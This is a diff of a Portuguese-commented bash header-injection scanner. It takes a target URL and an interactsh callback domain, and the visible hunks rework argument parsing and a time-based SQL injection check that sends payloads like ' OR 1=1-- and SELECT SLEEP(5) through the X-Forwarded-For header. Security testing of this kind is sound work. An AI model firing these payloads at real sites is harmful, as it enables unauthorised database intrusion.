@@ -1,26 +1,28 @@
 #!/bin/bash
-TARGET=$1
+
+# Captura parâmetros corretamente
+TARGET=""
 IACT_DOMAIN=""
 
-# Captura -i da linha de comando
-while [[ "$#" -gt 0 ]]; do
-  case $1 in
-    -i) IACT_DOMAIN="$2"; shift ;;
-    http*) TARGET="$1" ;;
-  esac
-  shift
+for ((i=1; i<=$#; i++)); do
+  arg="${!i}"
+  if [[ "$arg" == "-i" ]]; then
+    j=$((i+1))
+    IACT_DOMAIN="${!j}"
+  elif [[ "$arg" == http* ]]; then
+    TARGET="$arg"
+  fi
 done
 
 HOST=$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)
 
-if [ -z "$IACT_DOMAIN" ]; then
-  echo "[!] Informe o domínio interactsh com -i"
-  echo "Uso: bash testes_headers.sh https://alvo -i SEU-DOMINIO.oast.site"
+if [ -z "$TARGET" ] || [ -z "$IACT_DOMAIN" ]; then
+  echo "Uso: bash testes_headers.sh https://alvo -i DOMINIO.oast.site"
   exit 1
 fi
 
-echo "[*] Domínio interactsh: $IACT_DOMAIN"
 echo "[*] Target: $TARGET"
+echo "[*] Domínio interactsh: $IACT_DOMAIN"
 
 scan_target() {
   local url=$1
@@ -100,13 +102,16 @@ scan_target() {
     done
   done
 
-  # XFF SQLi
+  # XFF SQLi — sem bc, usa awk
   echo ""
   echo "=== XFF SQLi (time-based) ==="
   for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--" "1 AND SLEEP(5)--"; do
     elapsed=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
       -H "X-Forwarded-For: $payload" "$url")
-    if (( $(echo "$elapsed > 4" | bc -l) )); then
+    
+    # Compara sem bc usando awk
+    is_slow=$(awk "BEGIN {print ($elapsed > 4) ? 1 : 0}")
+    if [ "$is_slow" == "1" ]; then
       echo "[POSSIBLE SQLi] ${elapsed}s → $payload"
     else
       echo "[${elapsed}s] $payload"
@@ -114,7 +119,7 @@ scan_target() {
   done
 }
 
-# Roda nos dois protocolos
+# Roda uma vez em cada protocolo
 scan_target "http://$HOST" "HTTP"
 scan_target "https://$HOST" "HTTPS"
 
